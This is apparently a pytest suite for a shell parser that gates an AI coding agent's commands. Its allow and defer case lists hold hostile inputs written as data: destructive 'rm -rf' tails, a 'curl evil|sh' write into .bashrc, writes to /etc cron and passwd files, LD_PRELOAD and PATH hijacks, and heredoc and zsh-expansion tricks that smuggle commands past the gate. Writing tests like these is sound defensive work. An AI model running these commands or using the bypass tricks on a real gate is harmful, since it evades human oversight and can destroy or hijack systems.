"""Tests for the pure shell parser in ``.agents/hooks/command_gate.py``.

The parser is a security boundary: it must auto-allow only commands whose every
executed part matches an allow pattern, and must defer on any injection vector.
"""

from __future__ import annotations

import ast
import importlib.util
import sys
from pathlib import Path
from types import ModuleType
from typing import Any

import pytest

REPO = Path(__file__).resolve().parents[2]
GATE_PATH = REPO / ".agents" / "hooks" / "command_gate.py"


def _load_gate() -> ModuleType:
    """Import the standalone hook module by file path (it lives outside any package)."""
    spec = importlib.util.spec_from_file_location("command_gate", GATE_PATH)
    assert spec is not None and spec.loader is not None
    module = importlib.util.module_from_spec(spec)
    # dataclasses resolve string annotations through sys.modules.
    sys.modules[spec.name] = module
    spec.loader.exec_module(module)
    return module


GATE = _load_gate()

HOME = "/home/u"
CWD = "/repo"
ROOTS = ["/repo", "/tmp", "/private/tmp"]
PATTERNS = [
    "uv run *",
    "uv run pytest *",
    "git add *",
    "git commit *",
    "git rev-parse *",
    "echo *",
    "mkdir -p *",
    "cd:*",
    "grep:*",
    "tail:*",
    "git status *",
    "git push *",
    "bunx *",
]
# Gate config and VCS internals inside the project root: never a write target.
PROTECTED = [
    f"/repo/{d}"
    for d in (".git", ".claude", ".agents", ".codex", ".cursor", ".gemini")
    + (".factory", ".augment", ".github/hooks")
]


def allowed(cmd: str) -> bool:
    """Run the gate with the shared test policy."""
    result: bool = GATE.is_fully_allowed(cmd, PATTERNS, ROOTS, CWD, HOME)
    return result


BASELINE_ALLOW_CASES = [
    "PYTHONUNBUFFERED=1 uv run pytest tests/x.py -v 2>&1 | tail -40",
    'git add -A && git commit -m "wip"',
    'echo "HEAD: $(git rev-parse --short HEAD)"',
    "cd /x && mkdir -p /tmp/e2e && echo hi",
    "for bid in 1 2 3; do echo $bid; uv run pytest -q 2>&1 | tail -2; done",
    # Backslash-escaped quotes inside a commit message must not desync quote
    # tracking (a `\"` is NOT a string close inside double quotes).
    'git commit -m "migrate to preset:\\"none\\" and verify"',
    # Full worktree commit/push flow with escaped quotes + newlines in the body.
    (
        "cd /tmp/wt && git status --porcelain && git add f && "
        'git commit -m "fix: rewrites recommended:true to preset:\\"none\\"\n\nCloses #39" && '
        "git push -u origin chore/39-x"
    ),
]

BASELINE_DEFER_CASES = [
    # Compound with a hidden destructive tail.
    "uv run pytest && rm -rf /tmp/x",
    # Command substitution running something unlisted.
    "echo $(rm -rf /tmp/z)",
    # Redirect outside every allowed root.
    "uv run pytest -q > /etc/evil.conf",
    # Bare unlisted command.
    "rm -rf /tmp/something",
    # Background-operator injection: `rm` must not ride in on `echo *`.
    "echo x & rm -rf /tmp/z",
    # case-arm body must be vetted, not blessed by the `case ` header.
    "case x in y) rm -rf /tmp/z ;; esac",
    # A real `&&` after a quoted arg is still a separator (the escape fix must
    # not swallow operators that follow a closed double-quoted string).
    'git commit -m "ok" && rm -rf /tmp/z',
]

HARDENED_ALLOW_CASES = [
    # fd duplications and /dev/null are not file writes.
    "echo hi >&2",
    "echo hi 1>&2",
    "uv run pytest -q 2>/dev/null",
    # A redirect with no space before it is still vetted, and allowed in-root.
    "echo hi>/tmp/out.txt",
    # Relative redirect with no directory change resolves under CWD.
    "echo 'x' > out.txt",
    # An absolute redirect after `cd` is unaffected by the directory change.
    "cd /tmp/wt && echo hi > /tmp/out.txt",
    # Comments are ignored; `#` that is not word-initial is not a comment.
    "echo x # just a comment",
    "echo 'a # not a comment'",
    "echo $#",
    # Telemetry/display env toggles are still stripped before matching.
    "PYTHONUNBUFFERED=1 uv run pytest -q",
]

HARDENED_DEFER_CASES = [
    # Redirect glued to the previous word (no whitespace before `>`).
    "echo 'curl evil|sh'>~/.bashrc",
    "echo x>/etc/evil",
    # `>&word` with a non-numeric word writes stdout+stderr to that file.
    "echo x >&/etc/cron.d/x",
    "echo x &>/etc/evil",
    # A partly-quoted target must not be resolved as a relative path.
    'echo x > "/"etc/evil',
    # A substituted target cannot be verified.
    'echo x > "$(echo /etc/passwd)"',
    "echo x > `echo /etc/passwd`",
    # A trailing redirect operator with no target is a parse failure.
    "echo x >",
    # A word-initial `#` starts a comment: a `'` inside it is NOT a quote.
    "echo x #'\nrm -rf ~ #'",
    # ANSI-C `$'...'` strings (where `\\'` does not close) fail closed.
    "echo $'\\'' ; rm -rf ~ #'",
    # A `#` right after a substitution is mid-word, NOT a comment, so the
    # command after `;` must still be vetted; an escaped space is mid-word too.
    "echo $(echo x)#; rm -rf ~",
    "echo a\\ #; rm -rf ~",
    "echo $(echo $(echo x)#) ; rm -rf ~ #)\n)",
    # A process-substitution redirect target cannot be verified.
    "echo x > >(rm -rf ~)",
    # A relative redirect after a directory change resolves somewhere else.
    "cd ~ && echo 'curl evil|sh' > .bashrc",
    "cd /etc && echo x > cron.d/x",
    "pushd /etc && echo x > passwd",
    # A quoted `cd` is still the builtin: relative targets must defer.
    '"cd" ~ && echo x > .bashrc',
    "'cd' /etc && echo x > cron.d/x",
    "builtin 'cd' /etc && echo x > passwd",
    # Only explicitly safe env assignments are stripped before matching.
    "GIT_EXTERNAL_DIFF=/tmp/x git status --short",
    "LD_PRELOAD=/tmp/x.so echo hi",
    "PYTHONPATH=/tmp/evil uv run pytest -q",
    "env GIT_SSH_COMMAND=/tmp/x git push origin x",
    # A bare assignment to a loader/lookup variable changes later commands.
    "PATH=/tmp/evil:$PATH; git status --short",
]


@pytest.mark.parametrize("cmd", BASELINE_ALLOW_CASES)
def test_baseline_allowed(cmd: str) -> None:
    assert allowed(cmd) is True


@pytest.mark.parametrize("cmd", BASELINE_DEFER_CASES)
def test_baseline_deferred(cmd: str) -> None:
    assert allowed(cmd) is False


@pytest.mark.parametrize("cmd", HARDENED_ALLOW_CASES)
def test_hardened_allowed(cmd: str) -> None:
    assert allowed(cmd) is True


@pytest.mark.parametrize("cmd", HARDENED_DEFER_CASES)
def test_hardened_deferred(cmd: str) -> None:
    assert allowed(cmd) is False


def test_glued_redirect_is_vetted() -> None:
    assert allowed("echo x>/etc/evil") is False


def test_ampersand_redirect_to_file_is_vetted() -> None:
    assert allowed("echo x >&/etc/cron.d/x") is False


def test_hash_comment_quote_is_not_a_quote() -> None:
    assert allowed("echo x #'\nrm -rf ~ #'") is False


def test_ansi_c_string_fails_closed() -> None:
    assert allowed("echo $'\\'' ; rm -rf ~ #'") is False


def test_relative_redirect_after_cd_defers() -> None:
    assert allowed("cd /etc && echo x > cron.d/x") is False


def test_only_safe_env_assignments_are_stripped() -> None:
    assert allowed("LD_PRELOAD=/tmp/x.so echo hi") is False
    assert allowed("NO_COLOR=1 echo hi") is True


@pytest.mark.parametrize(
    ("pattern", "command", "expected"),
    [
        ("make lint", "make lint", True),
        ("make lint", "make lint x", False),
        ("uv run *", "uv run", True),
        ("uv run *", "uv runner", False),
        ("grep:*", "grep -r x", True),
        ("gh pr comment * bugbot run*", "gh pr comment 12 --body bugbot run", True),
        ("gh pr comment * bugbot run*", "gh pr comment 12 --body hi", False),
        ("~/bin/x *", "/home/u/bin/x a", True),
    ],
)
def test_pattern_syntax(pattern: str, command: str, expected: bool) -> None:
    assert GATE.pattern_matches(pattern, command, HOME) is expected


def test_wildcard_matching_is_linear() -> None:
    crafted = "a " + " " * 3000 + "y"
    assert GATE.pattern_matches("a * * * x", crafted, HOME) is False
    assert GATE.pattern_matches("a * * * x", "a 1 2 3 x", HOME) is True


def test_star_never_spans_operators() -> None:
    cmd = "gh pr comment 1 && rm -rf / && bugbot run"
    patterns = ["gh pr comment * bugbot run*"]
    assert GATE.is_fully_allowed(cmd, patterns, ROOTS, CWD, HOME) is False


def test_simple_commands() -> None:
    found = GATE.simple_commands("NO_COLOR=1 rg x | head -2 && echo $(git log -1)")
    assert sorted(found) == sorted(["git log -1", "rg x", "head -2", "echo $S"])
    assert GATE.simple_commands("echo 'unterminated") is None


def test_base_safe_env_names() -> None:
    assert GATE.BASE_SAFE_ENV_NAMES == frozenset(
        {
            "PYTHONUNBUFFERED",
            "PYTHONDONTWRITEBYTECODE",
            "NO_COLOR",
            "FORCE_COLOR",
            "CLICOLOR",
            "TZ",
            "LANG",
            "LC_ALL",
            "CI",
        }
    )


def test_py39_syntax() -> None:
    ast.parse(GATE_PATH.read_text(), feature_version=(3, 9))


# --- Policy model and verdicts -------------------------------------------------

BANNED = GATE.BannedPattern.from_dict(
    {
        "pattern": r"old_api\(",
        "message": "deprecated",
        "replacement": "new_api()",
        "exempt_paths": ["docs/**"],
    }
)


def _banned_policy(**kwargs: Any) -> Any:
    return GATE.Policy(banned=(BANNED,), **kwargs)


def _shell(cmd: str, policy: Any) -> Any:
    return GATE.shell_verdict(cmd, policy, CWD, ROOTS, HOME)


def test_banned_shell_denies() -> None:
    verdict = _shell("uv run python -c 'old_api()'", _banned_policy())
    assert verdict.decision == GATE.DENY
    assert r"old_api\(" in verdict.reason
    assert "deprecated" in verdict.reason
    assert "new_api()" in verdict.reason
    assert verdict.reason == (
        r"Blocked: this command matches banned pattern old_api\(: deprecated. "
        "Use instead: new_api()."
    )


def test_banned_read_only_search_is_not_denied() -> None:
    cmd = "rg -F 'old_api(' src | head"
    assert BANNED.regex.search(cmd)
    assert _shell(cmd, _banned_policy()).decision != GATE.DENY


def test_banned_read_only_piped_to_executor_denies() -> None:
    assert _shell("rg -l 'old_api(' | sh", _banned_policy()).decision == GATE.DENY


def test_banned_unparseable_denies() -> None:
    assert _shell('echo "old_api( ', _banned_policy()).decision == GATE.DENY


def test_allow_listed_gives_allow() -> None:
    assert _shell("make lint", GATE.Policy(allow=("make lint",))).decision == GATE.ALLOW


def test_unlisted_gives_no_opinion() -> None:
    policy = GATE.Policy(allow=("make lint",))
    assert _shell("make deploy", policy).decision == GATE.NO_OPINION


def test_withhold_beats_allow() -> None:
    policy = GATE.Policy(allow=("git *",), withhold=("git push *",))
    verdict = _shell("git status && git push origin x", policy)
    assert verdict.decision == GATE.NO_OPINION


def test_drifted_cwd_is_not_a_write_root() -> None:
    verdict = GATE.shell_verdict(
        "echo x > passwd",
        GATE.Policy(allow=("echo *",)),
        cwd="/etc",
        roots=["/repo", "/tmp"],
        home=HOME,
    )
    assert verdict.decision == GATE.NO_OPINION


def test_policy_safe_env_extends_base() -> None:
    policy = GATE.Policy(
        allow=("echo *",), safe_env=GATE.BASE_SAFE_ENV_NAMES | {"MY_TOGGLE"}
    )
    assert _shell("MY_TOGGLE=1 echo hi", policy).decision == GATE.ALLOW


def _edit(path: str, before: str, after: str) -> Any:
    return GATE.edit_verdict(path, before, after, _banned_policy(), "/repo")


def test_edit_adding_banned_denies() -> None:
    verdict = _edit("/repo/src/a.py", "", "old_api()")
    assert verdict.decision == GATE.DENY
    assert "this edit to /repo/src/a.py" in verdict.reason


def test_edit_keeping_existing_hit_is_allowed() -> None:
    verdict = _edit("/repo/src/a.py", "old_api()\n", "old_api()\nx = 1\n")
    assert verdict.decision == GATE.NO_OPINION


def test_edit_exempt_path() -> None:
    assert _edit("/repo/docs/a.md", "", "old_api()").decision == GATE.NO_OPINION


def test_edit_outside_root_is_never_exempt() -> None:
    assert _edit("/elsewhere/docs/a.md", "", "old_api()").decision == GATE.DENY


def test_invalid_regex_entry_is_skipped() -> None:
    assert GATE.BannedPattern.from_dict({"pattern": "("}) is None
    assert GATE.BannedPattern.from_dict({"message": "x"}) is None
    assert GATE.BannedPattern.from_dict({"pattern": 3}) is None


def test_read_only_forgiveness_withdrawn_for_file_writes() -> None:
    policy = _banned_policy(allow=("cat *", "grep *", "rg *"))
    for cmd in (
        "cat <<< 'old_api()' > src/a.py",
        "grep -h . <<< 'old_api()' >> src/a.py",
        "rg 'old_api(' > out.txt",
        "rg 'old_api(' &> out.txt",
        "rg 'old_api(' 1>out.txt",
    ):
        assert _shell(cmd, policy).decision == GATE.DENY, cmd


def test_read_only_forgiveness_kept_for_devnull_and_fd_dups() -> None:
    for cmd in ("rg 'old_api(' 2>&1", "rg 'old_api(' 2>/dev/null", "rg 'old_api(' >&2"):
        assert _shell(cmd, _banned_policy()).decision != GATE.DENY, cmd


@pytest.mark.parametrize(
    "entry",
    [
        {"pattern": r"old_api\(", "exempt_paths": "docs/**"},
        {"pattern": r"old_api\(", "exempt_paths": 5},
        {"pattern": r"old_api\(", "exempt_paths": [1]},
        {"pattern": r"old_api\(", "message": 3},
        {"pattern": r"old_api\(", "replacement": ["x"]},
        "old_api(",
        None,
        ["pattern"],
    ],
)
def test_malformed_entries_are_skipped(entry: Any) -> None:
    assert GATE.BannedPattern.from_dict(entry) is None


def test_withhold_catches_respellings() -> None:
    policy = GATE.Policy(allow=("git *",), withhold=("git push *",))
    for cmd in (
        "git  push origin x",
        "git -C . push origin",
        "git -c user.name=x --no-pager push origin",
        "git --git-dir=.git push origin",
        "git --work-tree . push origin",
    ):
        assert _shell(cmd, policy).decision == GATE.NO_OPINION, cmd
    assert _shell("git status", policy).decision == GATE.ALLOW


def test_read_only_forgiveness_withdrawn_for_program_running_options() -> None:
    for cmd in (
        "git grep -O'sh -c \"old_api()\"' x",
        "git grep --open-files-in-pager='sh -c old_api(' x",
        "rg --pre 'sh' 'old_api(' .",
        "rg --pre=sh 'old_api(' .",
    ):
        assert _shell(cmd, _banned_policy()).decision == GATE.DENY, cmd


# --- Final-review regressions ----------------------------------------------------

# A heredoc body is not modelled: its `'` would open a fake quote that swallows
# the real command lines after it, so any unquoted `<<` (not `<<<`) defers.
HEREDOC_SMUGGLE = (
    "git commit -m x <<'git add x'\n"
    "git add '\n"
    "git add x\n"
    "touch /tmp/PWN\n"
    "git add <<'git add x'\n"
    "'\n"
    "git add x"
)
HEREDOC_SMUGGLE_ECHO = (
    "echo x <<'echo x'\n"
    "echo '\n"
    "echo x\n"
    "touch /tmp/PWN\n"
    "echo <<'echo x'\n"
    "'\n"
    "echo x"
)

# Expansions that run code (or whose shape we do not model) defer.
ADVERSARIAL_DEFER_CASES = [
    HEREDOC_SMUGGLE,
    HEREDOC_SMUGGLE_ECHO,
    "cat <<EOF\nhi\nEOF",
    "y='a[$(touch /tmp/P)]'; git add ${x[y]}",
    "y='a[$(touch /tmp/P)]'; echo ${x:y}",
    "y='a[$(touch /tmp/P)]'; echo $[y]",
    "x='$(touch /tmp/P)'; echo ${x@P}",
    "echo ${(e)x}",
    "echo *(e:'touch /tmp/P':)",
    "echo =(touch /tmp/P)",
    'echo "$[1+1]"',
    'echo "${x:-$(touch /tmp/P)}"',
    "echo $((1+2))",
    "(touch /tmp/P)",
    "echo x; f() { touch /tmp/P; }",
    # Bash deletes backslash-newline before tokenizing (outside single quotes),
    # so a continuation must not hide `<<`, `${` or `$[` from the scanner.
    HEREDOC_SMUGGLE.replace("<<", "<\\\n<", 1),
    "y='a[$(touch /tmp/P)]'; git add $\\\n{x[y]}",
    "y='a[$(touch /tmp/P)]'; echo \"$\\\n{x[y]}\"",
    "y='a[$(touch /tmp/P)]'; echo $\\\n[y]",
    "echo $\\\n(touch /tmp/P)",
    # A comment is not continued, but the line after it still is.
    "echo x # \\\n" + HEREDOC_SMUGGLE.replace("<<", "<\\\n<", 1),
    # A continuation inside `cd` still changes directory.
    "c\\\nd /etc && echo x > passwd",
    # zsh GLOB_SUBST: `$~x` expands x as a glob, so a qualifier in it runs code.
    "x='*(e:touch /tmp/P:)'; git add $~x",
    "x='*(e:touch /tmp/P:)'; echo $~x",
    'echo "$~x"',
    # zsh subscripts `$x[y]` (unbraced, also in double quotes) and evaluates y
    # as math, which runs a `$(...)` nested in y's value.
    "y='a[$(touch /tmp/P)]'; echo $x[y]",
    "y='a[$(touch /tmp/P)]'; echo \"$x[y]\"",
    "echo $1[y]",
    "y='a[$(touch /tmp/P)]'; echo $x\\\n[y]",
    # --- Syntax allowlist (pre-merge review, 2026-11-17) ---
    # The user's decision: under the user's choice to allow only a conservative
    # syntax subset, this used-to-allow case now defers: ROOT is not a safe_env
    # name, so its assignment is not allowable.
    'ROOT="$(git rev-parse --show-toplevel)" && echo $ROOT',
    # C1: an escaped `>`/`<` is not a redirect, so the `&` after it separates.
    "git add x \\>&touch pwned",
    "git add x \\<&touch pwned",
    # C2: an escaped space must not end an assignment value or a wrapper option.
    "CI=a\\ bunx touch pwned",
    "CI='a'\\ bunx touch pwned",
    "env -u\\ bunx touch pwned",
    # C3: only bare wrappers (and `env -i`/`-u NAME`) are stripped.
    'env -S"touch\\_pwned" git add x',
    "env -S'touch pwned' git add x",
    "env -P./bin git add x",
    "env -C /tmp git add x",
    "env --chdir=/tmp git add x",
    "env --split-string='touch pwned' git add x",
    "env",
    "nice -n 5 git add x",
    "stdbuf -oL git add x",
    "timeout -s KILL 5 git add x",
    "timeout --foreground 5 git add x",
    "command -p git add x",
    "time -p git add x",
    "nohup -- git add x",
    # C4a: zsh `$#x[y]`, `$+x[y]`, `$^x[y]`, `$=x[y]` evaluate y as math.
    "git add $#x[y]",
    "git add $+x[y]",
    "git add $^x[y]",
    "git add $=x[y]",
    'git add "$#x[y]"',
    "git add $#x",
    "git add ${x}[y]",
    'git add "${x}[y]"',
    "git add $x/[ab]",
    'git add "$x"[ab]',
    "git add $(echo x)[ab]",
    'echo $"x"',
    "echo $%",
    "echo $12",
    # C4b: assigning a zsh integer special evaluates the value as math.
    "SECONDS='path[$(touch pwned)]'; git add x",
    "COLUMNS=y git add x",
    "HISTSIZE=y git add x",
    "LINES=y git add x",
    # C5: only safe_env names may be assigned, and a redirect alone defers.
    "path=./bin; git add x",
    "NULLCMD=./evil.sh; >/dev/null",
    ">/dev/null",
    "2>&1",
    "EDITOR=./evil.sh; git commit -m x",
    "VISUAL=./evil.sh git commit -m x",
    "x[y]=1; echo hi",
    "CI=$x[y] git add x",
    "CI=a[b] git add x",
    "CI=\\x git add x",
    # A loop variable is an assignment too (zsh `path` is tied to PATH).
    "for path in ./bin; do git add x; done",
    "for SECONDS in 1; do echo x; done",
    "for UID in 1; do echo x; done",
    # Rule 1: no backslash outside single quotes but a continuation, or a
    # double-quoted escape of `"`, `\\`, backtick or `$`.
    "echo a\\ b",
    'echo "a\\nb"',
    # I1: gate config and VCS internals are never write targets.
    "git add x > .agents/hooks/policy.json",
    "git add x >> .claude/settings.json",
    "git add x >> .git/hooks/pre-commit",
    "echo x > /repo/.github/hooks/command-gate.json",
    "echo x > .codex/hooks.json",
    "echo x > .gemini/settings.json",
]


@pytest.mark.parametrize("cmd", ADVERSARIAL_DEFER_CASES)
def test_adversarial_deferred(cmd: str) -> None:
    assert (
        GATE.is_fully_allowed(cmd, PATTERNS, ROOTS, CWD, HOME, protected=PROTECTED)
        is False
    )


SYNTAX_ALLOW_CASES = [
    "echo [ab] *.py",
    'echo "$HOME" $1 $# $? $$ $@ $* $- $0 ${HOME} ${1}',
    'echo "x$" a$ $',
    "CI=1 bunx foo",
    'CI="$(git rev-parse HEAD)" git add x',
    "CI=$HOME git add x",
    "env -i -u FOO CI=1 bunx foo",
    "env CI=1 git add x",
    "timeout 5 git add x",
    "timeout 1.5m git add x",
    "nice git add x",
    "nohup git add x",
    "time git add x",
    "command git add x",
    "builtin echo x",
    "for f in a b; do echo $f; done",
    "NO_COLOR=1 git add x",
    "CI=1",
    'git commit -m "a \\"b\\" \\$c \\\\ \\`d\\`"',
    "[ -f x ] && echo y",
    "echo x > out.txt",
    "echo x > /repo/.gitignore",
    "echo x > /repo/.github/workflows/x.yml",
]


@pytest.mark.parametrize("cmd", SYNTAX_ALLOW_CASES)
def test_syntax_subset_allowed(cmd: str) -> None:
    patterns = [*PATTERNS, "[ *"]
    assert (
        GATE.is_fully_allowed(cmd, patterns, ROOTS, CWD, HOME, protected=PROTECTED)
        is True
    )


def test_split_respects_escaped_redirect_chars() -> None:
    assert GATE.split_subcommands("git add x \\>&touch pwned") == [
        "git add x \\>",
        "touch pwned",
    ]


def _old_call_policy(**kwargs: Any) -> Any:
    banned = GATE.BannedPattern.from_dict(
        {"pattern": "old_call", "message": "gone", "replacement": "new_call"}
    )
    return GATE.Policy(banned=(banned,), **kwargs)


def test_escaped_redirect_banned_hit_denies() -> None:
    assert _shell("rg x \\>&old_call", _old_call_policy()).decision == GATE.DENY


def test_escaped_redirect_does_not_bypass_withhold() -> None:
    policy = GATE.Policy(allow=("git *",), withhold=("git push *",))
    verdict = _shell("git add x \\>&git push origin main", policy)
    assert verdict.decision == GATE.NO_OPINION


def test_zsh_integer_special_never_safe_env() -> None:
    policy = GATE.Policy(
        allow=("git add *",),
        safe_env=GATE.BASE_SAFE_ENV_NAMES | {"SECONDS", "COLUMNS", "LINES"},
    )
    for name in ("SECONDS", "COLUMNS", "LINES"):
        assert _shell(f"{name}=1 git add x", policy).decision == GATE.NO_OPINION
    assert "COLUMNS" not in GATE.BASE_SAFE_ENV_NAMES


def test_protected_path_through_symlink_defers(tmp_path: Path) -> None:
    root = tmp_path / "root"
    (root / ".claude").mkdir(parents=True)
    (root / "cfg").symlink_to(root / ".claude")
    protected = [str(root / ".claude")]
    ok = GATE.redirect_target_ok(
        "cfg/settings.json", [str(root)], str(root), "/h", protected=protected
    )
    assert ok is False
    assert GATE.redirect_target_ok(
        "src/x", [str(root)], str(root), "/h", protected=protected
    )


def test_overlong_command_is_no_opinion_but_banned_still_denies() -> None:
    long_cmd = "echo " + "a" * (64 * 1024)
    assert _shell(long_cmd, GATE.Policy(allow=("echo *",))).decision == GATE.NO_OPINION
    banned = _shell(long_cmd + " old_call", _old_call_policy(allow=("echo *",)))
    assert banned.decision == GATE.DENY


@pytest.mark.parametrize(
    "cmd",
    [
        "rg --pre=sh 'old_call' .",
        "rg --pr=sh old_call .",
        "rg --hostname-bin=sh old_call",
        "rg --hostname sh old_call",
        "git log --output=x -S old_call",
        "git log --out=x -S old_call",
        "git diff --ext-diff old_call",
        "git diff --ext old_call",
        "git show --textconv old_call",
        "git log --pager=sh old_call",
        "git grep --open-files-in-pager=sh old_call",
        "git grep -O old_call",
        "git grep -Osh old_call",
    ],
)
def test_read_only_forgiveness_withdrawn_for_runner_options(cmd: str) -> None:
    assert _shell(cmd, _old_call_policy()).decision == GATE.DENY, cmd


def test_read_only_forgiveness_kept_for_plain_search() -> None:
    for cmd in ("rg old_call src", "git log -S old_call", "grep -rn old_call ."):
        assert _shell(cmd, _old_call_policy()).decision == GATE.NO_OPINION, cmd


@pytest.mark.parametrize(
    "cmd",
    [
        "echo ${HOME} $1 ${1}",
        'echo "${HOME}/x"',
        "git commit -m 'fix (scope): x'",
        'git commit -m "feat(api): add (thing)"',
        "echo x <<< 'here string'",
    ],
)
def test_plain_expansions_and_quoted_parens_still_allowed(cmd: str) -> None:
    assert allowed(cmd) is True


def test_heredoc_with_banned_hit_still_denies() -> None:
    cmd = "cat <<'EOF'\nold_api()\nEOF"
    assert _shell(cmd, _banned_policy(allow=("cat *",))).decision == GATE.DENY


def test_heredoc_simple_commands_is_none() -> None:
    assert GATE.simple_commands(HEREDOC_SMUGGLE) is None


@pytest.mark.parametrize(
    "cmd",
    [
        "git --exec-path=/x push origin main",
        "git --config-env=a=b push origin main",
        "git --exec-path /x push origin main",
        "git --config-env a=b push origin main",
        "git -P push origin main",
        "git --no-optional-locks push origin main",
    ],
)
def test_withhold_skips_any_git_global_option(cmd: str) -> None:
    policy = GATE.Policy(allow=("git *",), withhold=("git push *",))
    assert _shell(cmd, policy).decision == GATE.NO_OPINION


def test_redirect_through_in_root_symlink_to_outside_defers(tmp_path: Path) -> None:
    root = tmp_path / "root"
    outside = tmp_path / "outside"
    root.mkdir()
    outside.mkdir()
    (root / "link").symlink_to(outside)
    (root / "file_link").symlink_to(outside / "f")
    roots = [str(root)]
    home = str(tmp_path / "home")
    assert GATE.redirect_target_ok("link/x", roots, str(root), home) is False
    assert GATE.redirect_target_ok("file_link", roots, str(root), home) is False
    assert GATE.redirect_target_ok(f"{root}/link/x", roots, str(root), home) is False
    assert GATE.redirect_target_ok("real/x", roots, str(root), home) is True


def test_git_grep_abbreviated_pager_option_denies() -> None:
    cmd = "git grep -e 'old_api(' --ope=sh"
    verdict = _shell(cmd, _banned_policy())
    assert verdict.decision == GATE.DENY
    assert r"old_api\(" in verdict.reason


@pytest.mark.parametrize(
    "cmd",
    [
        "echo a \\\n  b",
        'git commit -m "wip" \\\n  --no-verify',
        # Inside single quotes backslash-newline is literal.
        "echo 'a\\\nb'",
    ],
)
def test_line_continuations_still_allowed(cmd: str) -> None:
    assert allowed(cmd) is True


def test_escaped_backslash_before_newline_defers() -> None:
    # Allowed before the syntax allowlist (2026-11-17). An unquoted `\\` is a
    # backslash other than a continuation, so rule 1 now defers it.
    assert allowed("echo x\\\\\necho y") is False


def test_multi_line_continued_command_allowed() -> None:
    cmd = "gh pr view 1 \\\n  --json title \\\n  --jq .title"
    assert GATE.is_fully_allowed(cmd, ["gh pr view *"], ROOTS, CWD, HOME) is True


def test_continuation_does_not_hide_withheld_command() -> None:
    policy = GATE.Policy(allow=("git *",), withhold=("git push *",))
    assert _shell("git \\\npush origin x", policy).decision == GATE.NO_OPINION


@pytest.mark.parametrize(
    "cmd",
    ["git --attr-source HEAD push origin main", "git --attr-source=HEAD push origin"],
)
def test_withhold_skips_attr_source(cmd: str) -> None:
    policy = GATE.Policy(allow=("git *",), withhold=("git push *",))
    assert _shell(cmd, policy).decision == GATE.NO_OPINION
